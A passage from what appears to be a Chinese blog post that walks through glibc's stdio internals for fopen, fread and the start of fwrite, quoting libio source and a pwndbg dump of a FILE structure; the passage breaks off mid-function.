id="IO-new-file-fopen"><a href="#IO-new-file-fopen" class="headerlink" title="_IO_new_file_fopen"></a>_IO_new_file_fopen</h4><p>跟进判断函数，跳转到了/libio/fileops.c中的_IO_new_file_fopen函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, const char *filename, const char *mode,</span><br><span class="line">    int is32not64)</span><br></pre></td></tr></table></figure></p><p>前面先检查文件是否打开，之后设置打开模式，最后调用 _IO_file_open</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br></pre></td></tr></table></figure><h5 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h5><p>跟进_IO_file_open函数，可以看到，调用了系统级函数__open打开文件，之后设置fp-&gt;_fileno为文件描述符，最后再次调用_IO_link_in确保设置进入_IO_list_all。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_open (FILE *fp, const char *filename, int posix_mode, int prot,</span><br><span class="line">       int read_write, int is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  int fdesc;</span><br><span class="line">  if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = __open_nocancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  else</span><br><span class="line">    fdesc = __open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  if (fdesc &lt; 0)</span><br><span class="line">    return NULL;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  /* For append mode, send the file offset to the end of the file.  Don&apos;t</span><br><span class="line">     update the offset cache though, since the file handle is not active.  */</span><br><span class="line">  if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end);</span><br><span class="line">      if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">&#123;</span><br><span class="line">  __close_nocancel (fdesc);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  return fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后返回之后调用了__fopen_maybe_mmap，之后将fp指针返回，整个流程就结束了。</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h2><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区</p><p>根据输入缓冲区与目标缓冲区情况分别进行处理，底层调用read的系统调用来进行读取并复制</p><h2 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h2><p>进入之前再查看下FILE结构体fp指针的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *fp</span><br><span class="line">$6 = &#123;</span><br><span class="line">  _flags = -72539008, </span><br><span class="line">  _IO_read_ptr = 0x0, </span><br><span class="line">  _IO_read_end = 0x0, </span><br><span class="line">  _IO_read_base = 0x0, </span><br><span class="line">  _IO_write_base = 0x0, </span><br><span class="line">  _IO_write_ptr = 0x0, </span><br><span class="line">  _IO_write_end = 0x0, </span><br><span class="line">  _IO_buf_base = 0x0, </span><br><span class="line">  _IO_buf_end = 0x0, </span><br><span class="line">  _IO_save_base = 0x0, </span><br><span class="line">  _IO_backup_base = 0x0, </span><br><span class="line">  _IO_save_end = 0x0, </span><br><span class="line">  _markers = 0x0, </span><br><span class="line">  _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">  _fileno = 3, </span><br><span class="line">  _flags2 = 0, </span><br><span class="line">  _old_offset = 0, </span><br><span class="line">  _cur_column = 0, </span><br><span class="line">  _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">  _shortbuf = &quot;&quot;, </span><br><span class="line">  _lock = 0x6020f0, </span><br><span class="line">  _offset = -1, </span><br><span class="line">  _codecvt = 0x0, </span><br><span class="line">  _wide_data = 0x602100, </span><br><span class="line">  _freeres_list = 0x0, </span><br><span class="line">  _freeres_buf = 0x0, </span><br><span class="line">  __pad5 = 0, </span><br><span class="line">  _mode = 0, </span><br><span class="line">  _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="fread-gt-IO-fread"><a href="#fread-gt-IO-fread" class="headerlink" title="fread-&gt;_IO_fread"></a>fread-&gt;_IO_fread</h3><p>跟进fread函数，看到是位于/libio/fread.c中的_IO_fread,看到先计算了请求字节数，之后对fp加锁，执行_IO_sgetn，之后释放锁。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fread (void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t bytes_requested = size * count;</span><br><span class="line">  size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (bytes_requested == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  return bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="IO-sgetn-gt-IO-XSGETN"><a href="#IO-sgetn-gt-IO-XSGETN" class="headerlink" title="_IO_sgetn ==&gt; _IO_XSGETN"></a>_IO_sgetn ==&gt; _IO_XSGETN</h4><p>可以看到主体应该是_IO_sgetn函数，跟进该函数,发现主体为_IO_XSGETN函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_sgetn (FILE *fp, void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  /* FIXME handle putback buffer here! */</span><br><span class="line">  return _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_sgetn)</span><br></pre></td></tr></table></figure></p><p>查看定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></pre></td></tr></table></figure></p><p>继续跟进，进入/libio/fileops.c，该函数较长，做了不少事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_file_xsgetn (FILE *fp, void *data, size_t n)</span><br></pre></td></tr></table></figure></p><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h5 id="第一步：-IO-doallocbuf"><a href="#第一步：-IO-doallocbuf" class="headerlink" title="第一步：_IO_doallocbuf"></a>第一步：_IO_doallocbuf</h5><p>跟进_IO_doallocbuf,进入/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;_IO_buf_base)</span><br><span class="line">    return;</span><br><span class="line">  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0)</span><br><span class="line">    if (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      return;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure></p><p>这里重新回顾下开始时的结构体状态，这些变量未被初始化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x0, </span><br><span class="line">_IO_read_end = 0x0, </span><br><span class="line">_IO_read_base = 0x0, </span><br><span class="line">_IO_buf_base = 0x0, </span><br><span class="line">_IO_buf_end = 0x0,</span><br></pre></td></tr></table></figure></p><h6 id="IO-file-doallocate"><a href="#IO-file-doallocate" class="headerlink" title="_IO_file_doallocate"></a>_IO_file_doallocate</h6><p>因此开始检验是否被初始化，如果已经初始化就返回。检查标志位之后调用vtable中的_IO_file_doallocate，由注释可以看到这个函数主要用来分配输入缓冲区。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span><br><span class="line">   TTY devices default to line buffered.  */</span><br><span class="line">int</span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t size;</span><br><span class="line">  char *p;</span><br><span class="line">  struct stat64 st;</span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  /* Possibly a tty.  */</span><br><span class="line">  if (</span><br><span class="line">#ifdef DEV_TTY_P</span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line">#endif</span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line">#if defined _STATBUF_ST_BLKSIZE</span><br><span class="line">      if (st.st_blksize &gt; 0 &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">  p = malloc (size);</span><br><span class="line">  if (__glibc_unlikely (p == NULL))</span><br><span class="line">    return EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, 1);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure></p><p>首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的 __stat函数，获取文件信息，这里是通过_fxstat64来获取，其内部是通过系统调用来实现，之后对size进行设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_stat (_IO_FILE *fp, void *st)</span><br><span class="line">&#123; </span><br><span class="line">    return __fxstat64 (_STAT_VER, fp-&gt;_fileno, (struct stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure></p><p>再之后通过malloc得到分配的缓冲区，再调用<code>_IO_setb</code>设置FILE缓冲区<br>跟进_IO_setb,设置了_IO_buf_base和_IO_buf_end，还有_flags<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_setb (FILE *f, char *b, char *eb, int a)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    free (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  if (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  else</span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure></p><p>之后逐步返回到_IO_file_xsgetn</p><p>可以看到_IO_buf_base与_IO_buf_end都被设置了，大小为0x1000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = 0x602240 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x603240 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while (want &gt; 0)    </span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      if (want &lt;= have)                                  //如果缓冲区里有足够的字符，就直接将缓冲区里的字符复制到目标区</span><br><span class="line">&#123;</span><br><span class="line">  memcpy (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   else</span><br><span class="line">&#123;</span><br><span class="line">  if (have &gt; 0)                                       //如果缓冲区字符不够，就将其先复制到目标区</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="第四步：-underflow"><a href="#第四步：-underflow" class="headerlink" title="第四步：__underflow"></a>第四步：__underflow</h5><p>因为是第一次读取数据，此时的fp-&gt;_IO_read_end以及fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* If we now want less than a buffer, underflow and repeat</span><br><span class="line">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="line">     the user buffer. */</span><br><span class="line">  if (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))       //输入缓冲区不能满足需求，调用__underflow读入数据</span><br><span class="line">    &#123;</span><br><span class="line">      if (__underflow (fp) == EOF)</span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>进入__underflow函数，位于/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (_IO_vtable_offset (fp) == 0 &amp;&amp; _IO_fwide (fp, -1) != -1)</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_mode == 0)</span><br><span class="line">    _IO_fwide (fp, -1);</span><br><span class="line">  if (_IO_in_put_mode (fp))</span><br><span class="line">    if (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  if (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  if (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      if (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  return _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure></p><p>可以看到经过一些检查之后会调用_IO_UNDERFLOW,跟进，调用了/libio/fileops.c中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br></pre></td></tr></table></figure></p><p>检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /<em> Reading not allowed </em>/。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果fp-&gt;_IO_buf_base为null，则调用_IO_doallocbuf分配输入缓冲区。和前面一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure></p><p>调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，<br>数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></p><p>设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。<br>设置完之后通过while循环进入第二部分将输入缓冲区拷贝至目标缓冲区，流程结束，返回。</p><ul><li>ray-cp大佬解释了下为什么最后在_IO_UNDERFLOW中又一次检查调用了_IO_doallocbuf分配输入缓冲区。因为虽然一般的输入底层都在调用__underflow函数，但是并非全部,scanf函数调用的是_u_flow函数，其内部并未提前分配缓冲区，之后也调用了_IO_UNDERFLOW函数，因此需要在这里进行缓冲区的分配。</li></ul><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><h2 id="框架-2"><a href="#框架-2" class="headerlink" title="框架"></a>框架</h2><p>主体是_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow建立刷新缓冲区，<br>其中_IO_file_doallocate负责缓冲区的申请建立<br>最后调用_IO_default_xsputn将剩余输出至输出缓冲区</p><h2 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h2><h3 id="fwrite-gt-IO-fwrite"><a href="#fwrite-gt-IO-fwrite" class="headerlink" title="fwrite-&gt;_IO_fwrite"></a>fwrite-&gt;_IO_fwrite</h3><p>跟进，进入_IO_fwrite函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t request = size * count;</span><br><span class="line">  size_t written = 0;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (request == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)</span><br><span class="line">    written = _IO_sputn (fp, (const char *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  /* We have written all of the input in case the return value indicates</span><br><span class="line">     this or EOF is returned.  The latter is a special case where we</span><br><span class="line">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="line">     buffer and therefore written as far as fwrite is concerned.  */</span><br><span class="line">  if (written == request || written == EOF)</span><br><span class="line">    return count;</span><br><span class="line">  else</span><br><span class="line">    return written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure><h3 id="IO-sputn-gt-IO-new-file-xsputn"><a href="#IO-sputn-gt-IO-new-file-xsputn" class="headerlink" title="_IO_sputn-&gt;_IO_new_file_xsputn"></a>_IO_sputn-&gt;_IO_new_file_xsputn</h3><p>可以看到前面的流程和fread相似，之后调用了主体函数_IO_sputn，跟进，进入了/libio/fileops.c中的_IO_new_file_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">...</span><br><span class="line">/* First figure out how much space is available in the buffer. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = 